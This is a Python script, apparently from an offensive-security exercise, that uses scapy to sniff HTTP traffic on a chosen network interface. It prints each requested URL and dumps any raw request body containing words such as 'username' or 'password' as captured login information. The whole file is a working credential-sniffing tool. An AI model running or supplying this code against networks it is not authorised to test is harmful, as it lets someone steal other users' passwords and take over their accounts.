#!usr/bin/env python 

# sudo pip install scapy_http
import scapy.all as sp
from scapy.layers import http
import argparse
from sys import exit
from colors import *


def get_args():
	'''
	description: get arguments from the command line.
	params: None
	returns: interface(str) 
	'''
	parser = argparse.ArgumentParser(description='Packet Sniffer')
	parser.add_argument('-i', '--interface', dest='interface', help='choose interface')
	args = parser.parse_args()

	interface = args.interface
	
	del parser
	return interface


def check_args(intrfce):
	'''
	description: checks if the passed arguments are valid. if valid returns True.
	params: intrfce(str)
	returns: bool
	'''
	if not intrfce:
		exit(BRIGHT_RED + "[-] Please enter interface argument, use -h or --help for more info")
	return True


def get_url(packet):
	'''
	description: extract url from the packet.
	params: packet
	returns: url(str)
	'''
	print('IN GET URL')
	return str(packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path, encoding='utf-8')


def get_login_info(packet):
	'''
	description: extract login information from the sniffed packet.
	params: packet
	returns: url with login information
	'''
	if packet.haslayer(sp.Raw):
			load = str(packet[sp.Raw].load,encoding='utf-8')
			keywords = ["username", "user", "password", "pass", "login"]
			for keyword in keywords:
				if keyword in load:
					return load


def sniffer(intrfce, args_status):
	'''
	description: sniffs packets over the network.
	params: intrfce, args_status
	returns: None
	'''
	try:
		if args_status:
			sp.sniff(iface=intrfce, store=False, prn=process_sniffed_pkt)
	except Exception as e:
		print(BRIGHT_RED + '[-] An error occured while sniffing...')
		print(e)


def process_sniffed_pkt(packet):
	'''
	description: analyzes the captured packet for login information.
	params: packet
	returns: None
	'''
	if packet.haslayer(http.HTTPRequest):
		
		url = get_url(packet)
		print(BRIGHT_WHITE + '[+] Http Request >> ' + url + '\n')

		login_info = get_login_info(packet)
		if login_info:
			print(BRIGHT_YELLOW + '\n\n[+] Contains possible Login information :\n' + login_info + '\n\n')


if __name__ == '__main__':
	try:
		INTERFACE = get_args()
		ARGS_STATUS = check_args(INTERFACE)
		print(BRIGHT_YELLOW + f'[*] Sniffing Packets over interface {INTERFACE}')
		sniffer(INTERFACE, ARGS_STATUS)
	except KeyboardInterrupt:
		print(BRIGHT_YELLOW + '\r[-] ctrl+c detected...')
	except Exception as e:
		print(BRIGHT_RED + '[-] Closing Program due to Error...')
		print(e)
	finally:
		print(BRIGHT_RED + '\r[-] Exiting Sniffer..')
